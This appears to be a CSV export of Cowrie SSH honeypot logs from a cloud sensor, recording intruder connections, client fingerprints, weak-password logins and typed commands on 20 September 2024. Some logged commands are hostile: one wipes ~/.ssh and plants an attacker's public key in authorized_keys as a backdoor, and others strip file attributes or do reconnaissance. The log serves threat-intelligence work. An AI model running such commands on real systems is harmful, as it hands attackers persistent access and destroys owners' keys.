"TimeGenerated [UTC]","Timestamp [UTC]",RawData,Message,Severity,TenantId,Type,"_ResourceId"
"9/20/2024, 11:39:19.303 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""2.228.25.92"",""src_port"":57734,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""2ec949347d19"",""protocol"":""ssh"",""message"":""New connection: 2.228.25.92:57734 (10.0.0.4:2222) [session: 2ec949347d19]"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:19.302688Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:19.305 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-libssh_0.9.6"",""message"":""Remote SSH version: SSH-2.0-libssh_0.9.6"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:19.304109Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:19.418 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""f555226df1963d1d3c09daf865abdc9a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group18-sha512"",""diffie-hellman-group16-sha512"",""diffie-hellman-group-exchange-sha256"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""diffie-hellman-group1-sha1"",""ext-info-c""],""keyAlgs"":[""ssh-ed25519"",""ecdsa-sha2-nistp521"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp256"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss""],""encCS"":[""aes256-gcm@openssh.com"",""aes128-gcm@openssh.com"",""aes256-ctr"",""aes192-ctr"",""aes128-ctr"",""aes256-cbc"",""aes192-cbc"",""aes128-cbc"",""3des-cbc""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-512-etm@openssh.com"",""hmac-sha1-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha2-512"",""hmac-sha1""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:19.415931Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:19.946 AM",,"{""eventid"":""cowrie.login.success"",""username"":""user1"",""password"":""12345"",""message"":""login attempt [user1/12345] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:19.945537Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.260 AM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.259758Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.262 AM",,"{""eventid"":""cowrie.command.input"",""input"":""cd ~; chattr -ia .ssh; lockr -ia .ssh"",""message"":""CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.261223Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.264 AM",,"{""eventid"":""cowrie.command.failed"",""input"":""lockr -ia .ssh"",""message"":""Command not found: lockr -ia .ssh"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.264233Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.490 AM",,"{""eventid"":""cowrie.log.closed"",""ttylog"":""var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644"",""size"":32,""shasum"":""c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644"",""duplicate"":false,""duration"":0.22824549674987793,""message"":""Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.487667Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.685 AM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.678473Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.686 AM",,"{""eventid"":""cowrie.command.input"",""input"":""cd ~ && rm -rf .ssh && mkdir .ssh && echo \""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"",""message"":""CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo \""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.685521Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.803 AM",,"{""eventid"":""cowrie.session.file_download"",""duplicate"":false,""outfile"":""var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"",""shasum"":""a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"",""destfile"":""/home/user1/.ssh/authorized_keys"",""message"":""Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.801287Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.806 AM",,"{""eventid"":""cowrie.log.closed"",""ttylog"":""var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f"",""size"":0,""shasum"":""cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f"",""duplicate"":false,""duration"":0.12624573707580566,""message"":""Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.804214Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.906 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""2.228.25.92"",""src_port"":58364,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""0e045697c64f"",""protocol"":""ssh"",""message"":""New connection: 2.228.25.92:58364 (10.0.0.4:2222) [session: 0e045697c64f]"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.905730Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:20.908 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-libssh_0.9.6"",""message"":""Remote SSH version: SSH-2.0-libssh_0.9.6"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:20.907319Z"",""src_ip"":""2.228.25.92"",""session"":""0e045697c64f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.017 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""f555226df1963d1d3c09daf865abdc9a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group18-sha512"",""diffie-hellman-group16-sha512"",""diffie-hellman-group-exchange-sha256"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""diffie-hellman-group1-sha1"",""ext-info-c""],""keyAlgs"":[""ssh-ed25519"",""ecdsa-sha2-nistp521"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp256"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss""],""encCS"":[""aes256-gcm@openssh.com"",""aes128-gcm@openssh.com"",""aes256-ctr"",""aes192-ctr"",""aes128-ctr"",""aes256-cbc"",""aes192-cbc"",""aes128-cbc"",""3des-cbc""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-512-etm@openssh.com"",""hmac-sha1-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha2-512"",""hmac-sha1""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.015205Z"",""src_ip"":""2.228.25.92"",""session"":""0e045697c64f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.490 AM",,"{""eventid"":""cowrie.login.success"",""username"":""345gs5662d34"",""password"":""345gs5662d34"",""message"":""login attempt [345gs5662d34/345gs5662d34] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.489267Z"",""src_ip"":""2.228.25.92"",""session"":""0e045697c64f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.601 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.6935734748840332,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.600756Z"",""src_ip"":""2.228.25.92"",""session"":""0e045697c64f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.708 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""2.228.25.92"",""src_port"":58568,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""1124547e066c"",""protocol"":""ssh"",""message"":""New connection: 2.228.25.92:58568 (10.0.0.4:2222) [session: 1124547e066c]"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.706878Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.709 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-libssh_0.9.6"",""message"":""Remote SSH version: SSH-2.0-libssh_0.9.6"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.708498Z"",""src_ip"":""2.228.25.92"",""session"":""1124547e066c""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:21.822 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""f555226df1963d1d3c09daf865abdc9a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group18-sha512"",""diffie-hellman-group16-sha512"",""diffie-hellman-group-exchange-sha256"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""diffie-hellman-group1-sha1"",""ext-info-c""],""keyAlgs"":[""ssh-ed25519"",""ecdsa-sha2-nistp521"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp256"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss""],""encCS"":[""aes256-gcm@openssh.com"",""aes128-gcm@openssh.com"",""aes256-ctr"",""aes192-ctr"",""aes128-ctr"",""aes256-cbc"",""aes192-cbc"",""aes128-cbc"",""3des-cbc""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-512-etm@openssh.com"",""hmac-sha1-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha2-512"",""hmac-sha1""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:21.820076Z"",""src_ip"":""2.228.25.92"",""session"":""1124547e066c""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:22.309 AM",,"{""eventid"":""cowrie.login.success"",""username"":""user1"",""password"":""3245gs5662d34"",""message"":""login attempt [user1/3245gs5662d34] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:22.308168Z"",""src_ip"":""2.228.25.92"",""session"":""1124547e066c""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:22.422 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.7138738632202148,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:22.422110Z"",""src_ip"":""2.228.25.92"",""session"":""1124547e066c""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 11:39:22.429 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":3.1245369911193848,""message"":""Connection lost after 3 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T11:39:22.428499Z"",""src_ip"":""2.228.25.92"",""session"":""2ec949347d19""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:54.906 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""101.126.4.240"",""src_port"":19476,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""3928b65a9140"",""protocol"":""ssh"",""message"":""New connection: 101.126.4.240:19476 (10.0.0.4:2222) [session: 3928b65a9140]"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:54.905469Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:55.165 PM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.25769805908203125,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:55.164672Z"",""src_ip"":""101.126.4.240"",""session"":""3928b65a9140""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:56.154 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""101.126.4.240"",""src_port"":19486,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""700ced9a0ee0"",""protocol"":""ssh"",""message"":""New connection: 101.126.4.240:19486 (10.0.0.4:2222) [session: 700ced9a0ee0]"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:56.153651Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:56.156 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:56.155282Z"",""src_ip"":""101.126.4.240"",""session"":""700ced9a0ee0""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:56.739 PM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""98f63c4d9c87edbd97ed4747fa031019"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""rsa-sha2-256-cert-v01@openssh.com"",""rsa-sha2-512-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""ssh-dss-cert-v01@openssh.com"",""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ssh-ed25519-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521"",""rsa-sha2-256"",""rsa-sha2-512"",""ssh-rsa"",""ssh-dss"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""aes256-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-512-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha2-512"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:56.737227Z"",""src_ip"":""101.126.4.240"",""session"":""700ced9a0ee0""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:57.526 PM",,"{""eventid"":""cowrie.login.success"",""username"":""root"",""password"":""---fuck_you----"",""message"":""login attempt [root/---fuck_you----] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:57.525264Z"",""src_ip"":""101.126.4.240"",""session"":""700ced9a0ee0""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:58.071 PM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:58.069500Z"",""src_ip"":""101.126.4.240"",""session"":""700ced9a0ee0""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:17:58.072 PM",,"{""eventid"":""cowrie.command.input"",""input"":""uname -s -m"",""message"":""CMD: uname -s -m"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:17:58.072154Z"",""src_ip"":""101.126.4.240"",""session"":""700ced9a0ee0""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
